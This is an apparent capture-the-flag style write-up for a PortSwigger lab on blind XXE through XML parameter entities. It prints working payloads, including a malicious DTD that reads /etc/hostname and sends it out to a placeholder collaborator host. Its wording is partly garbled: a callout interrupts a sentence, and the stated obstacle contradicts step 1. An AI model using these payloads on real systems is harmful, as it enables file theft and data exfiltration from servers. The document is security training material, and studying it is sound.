# Lab 04 — Blind XXE with out-of-band interaction via XML parameter entities

> **Expert** · [Official lab](https://portswigger.net/web-security/xxe/blind-xxe-with-out-of-band-interaction-via-xml-parameter-entity)

**Entry point:** `POST /product/stock` · **Obstacle:** the request may not

> 🔧 **Burp Community alternative:** the tool named below is Pro-only — the free replacement is described in the steps.
contain a DOCTYPE (blocked), so smuggle it via a **local DTD trick**.

## Solution

1. The server blocks full DOCTYPEs? — no: the trick here is that regular
   entity usage is filtered, so smuggle the whole external DTD reference
   through parameter entities declared in an inline DOCTYPE:

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://YOUR-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

2. If direct external DTDs are blocked, point `%x` at a **malicious DTD you
   host on the exploit server** and chain a second parameter entity:

   exploit server file (`/evil.dtd`):
   ```xml
   <!ENTITY % file SYSTEM "file:///etc/hostname">
   <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://COLLAB/?%file;'>">
   %eval;
   %exfiltrate;
   ```
   request:
   ```xml
   <!DOCTYPE foo [ <!ENTITY % x SYSTEM "https://YOUR-EXPLOIT-SERVER/evil.dtd"> %x; ]>
   ```

3. Poll Collaborator — the interaction (or exfiltrated hostname) proves the
   injection — lab solved.

## Notes

Parameter entities are the only entities resolvable from inside a DTD —
they enable both OOB callbacks and multi-stage exfiltration.
